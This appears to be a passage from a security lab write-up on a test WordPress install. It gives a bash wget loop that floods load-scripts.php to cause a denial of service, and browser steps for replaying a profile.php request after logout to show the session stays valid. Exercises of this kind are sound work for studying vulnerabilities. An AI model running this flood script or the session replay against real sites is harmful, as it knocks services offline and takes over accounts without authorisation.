  - [ ] Steps to recreate:<br />
  1. Create a script or use an automated tool to request the following URL in a loop:<br />
            `https://your-wordpress-site.com/wp-admin/load-scripts.php?c=1&load=editor,common,user-profile,media-widgets,media-gallery`<br />
  2. I used bash to create the following script :<br />
  ```
  #!/bin/bash
  while :
  do
  	wget -O/dev/null -q http://wpdistillery.vm/wp-admin/load-scripts.php?c=1&load=editor,common,user-profile,media- widgets,media-gallery
  done 
  ```
   3. On the command line, make your script executable: <br />
            `$ chmod + x your-DoS-script.sh`<br />
   4. Run your script and that will overload your WP server causing the DoS<br />
            `$ ./your-DoS-script.sh`<br />
  - [ ] Affected source code:
    - [Unauthenticated DoS affected source code](https://core.trac.wordpress.org/browser/branches/3.9/src/wp-admin/load-scripts.php)
    <br /> <br />

    This vulnerability can be recreated using Burp Proxy or through a browser's network developer tools  <br />
    This steps are done using Firefox  <br /> <br />
    1. Request the WordPress Admin Profile page through the following URL   <br />
            `https://domainname.com/wp-admin/profile.php`  <br />
    2. Open Developer Tools on Firefox entering Ctrl + Shift + C  <br />
    3. Select the Networking tab on the Developer Tools  <br />
    4. Log in as admin  <br />
    5. Find and select the `profile.php` GET request   <br />
    6. Select `Edit and Resend`  <br />
    7. Open a new tab on your browser  <br />
    8. Go to your WordPress page and log out from the new tab  <br />
    9. Move back to our first tab and resend the `profile.php` GET request  <br /> <br /> 
    This should take you to the Admin Profile page eve though the session was supposed to be terminated on our second tab  <br />

## Notes

Trying to recreate SQL injection vulnerabilities was very time consuming and I was not able to see any proof of my attacks being successful.
